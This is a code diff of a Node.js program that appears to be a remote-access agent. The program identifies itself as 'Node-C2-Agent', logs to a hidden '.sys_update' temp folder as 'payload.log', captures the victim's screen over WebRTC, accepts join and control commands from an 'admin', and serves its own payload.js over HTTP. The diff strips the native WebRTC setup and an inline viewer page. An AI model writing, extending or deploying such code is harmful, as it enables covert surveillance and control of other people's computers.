@@ -7,15 +7,6 @@ const https = require('https');
 const crypto = require('crypto');
 const http = require('http'); 
 
-// --- WEBRTC SETUP (Node.js Native) ---
-const { RTCPeerConnection, RTCSessionDescription, MediaStream, mediaDevices } = require('@roamhq/wrtc');
-
-// Expose navigator to satisfy library checks and provide getDisplayMedia
-global.navigator = {
-    mediaDevices: mediaDevices,
-    userAgent: 'Node-C2-Agent'
-};
-
 // --- LOGGING SYSTEM ---
 const LOG_DIR = path.join(os.tmpdir(), '.sys_update');
 const LOG_FILE = path.join(LOG_DIR, 'payload.log');
@@ -105,7 +96,7 @@ function initConnection() {
  log(`[JOIN] Request join received from ${data.from}`);
  handleJoinRequest(data.from);
  } else if (data.type === 'start_join') {
- // Explicitly start the join process when requested by admin
+ // NEW: Explicitly start the join process when requested by admin
  log(`[JOIN] Starting join initiated by ${data.from}`);
  handleJoinRequest(data.from);
  } else if (data.type === 'offer') {
@@ -185,8 +176,7 @@ function startMonitoring() {
 async function setupLocalStream() {
  if (localStream) return localStream;
  try {
- log("[WEBRTC] Requesting screen access via native bindings...");
- // Use the exposed navigator from @roamhq/wrtc
+ log("[WEBRTC] Requesting screen access...");
  localStream = await navigator.mediaDevices.getDisplayMedia({
  video: { cursor: "always" },
  audio: false
@@ -374,7 +364,7 @@ function takeControl(state) {
  isSessionActive = state;
 }
 
-// --- HTTP SERVER FOR LOCAL VIEWER (Optional but good for debugging) ---
+// --- HTTP SERVER SETUP ---
 const PORT = process.env.PORT || 3000;
 
 const server = http.createServer((req, res) => {
@@ -383,24 +373,14 @@ const server = http.createServer((req, res) => {
  res.end(fs.readFileSync(path.join(__dirname, 'payload.js'), 'utf8'));
  } 
  else if (req.url === '/' || req.url === '/index.html') {
- const htmlContent = `
- <!DOCTYPE html>
- <html>
- <body style="background:#000; margin:0; display:flex; justify-content:center; align-items:center; height:100vh;">
-     <video id="remoteVideo" autoplay playsinline style="width:100%; height:100%; object-fit:contain;"></video>
- </body>
- <script>
-     // This script waits for the parent process to inject the stream
-     window.addEventListener('message', (event) => {
-         if (event.data && event.data.stream) {
-             document.getElementById('remoteVideo').srcObject = event.data.stream;
-         }
-     });
- </script>
- </html>
- `;
+ const indexPath = path.join(__dirname, 'index.html');
+ if (fs.existsSync(indexPath)) {
  res.writeHead(200, { 'Content-Type': 'text/html' });
- res.end(htmlContent);
+ res.end(fs.readFileSync(indexPath));
+ } else {
+ res.writeHead(404);
+ res.end('index.html not found');
+ }
  } 
  else if (req.url === '/health') {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
